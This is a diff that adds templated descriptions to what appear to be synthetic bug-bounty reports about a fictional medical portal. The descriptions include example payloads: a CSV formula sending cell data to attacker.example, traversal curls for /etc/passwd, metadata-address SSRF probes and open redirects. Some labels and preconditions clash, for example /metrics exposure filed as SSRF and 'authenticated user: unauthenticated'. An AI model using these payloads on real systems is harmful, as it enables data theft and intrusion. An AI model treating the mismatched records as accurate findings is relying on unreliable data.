+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15442,7 +15556,8 @@
           "offset": "3d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15580,7 +15695,8 @@
           "offset": "5d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15685,7 +15801,8 @@
           "offset": "4d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15853,7 +15970,8 @@
           "offset": "2d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://updates.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15953,7 +16071,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://cloud.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16028,7 +16147,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16139,7 +16259,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16258,7 +16379,8 @@
           "offset": "1d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16353,7 +16475,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16472,7 +16595,8 @@
           "offset": "1d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16620,7 +16744,8 @@
           "offset": "1d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16748,7 +16873,8 @@
           "offset": "5d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16883,7 +17009,8 @@
           "offset": "3d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17063,7 +17190,8 @@
           "offset": "7d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17178,7 +17306,8 @@
           "offset": "2d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17309,7 +17438,8 @@
           "offset": "3d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17413,7 +17543,8 @@
           "offset": "3d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://cloud.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17516,7 +17647,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17652,7 +17784,8 @@
           "offset": "6d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17786,7 +17919,8 @@
           "offset": "6d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://docs.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17916,7 +18050,8 @@
           "offset": "8d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18043,7 +18178,8 @@
           "offset": "2d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18213,7 +18349,8 @@
           "offset": "7d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18340,7 +18477,8 @@
           "offset": "5d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18470,7 +18608,8 @@
           "offset": "6d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18544,7 +18683,8 @@
           "offset": "11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18684,7 +18824,8 @@
           "offset": "7d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18872,7 +19013,8 @@
           "offset": "8d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://docs.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19023,7 +19165,8 @@
           "offset": "9d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19211,7 +19354,8 @@
           "offset": "6d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19358,7 +19502,8 @@
           "offset": "5d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
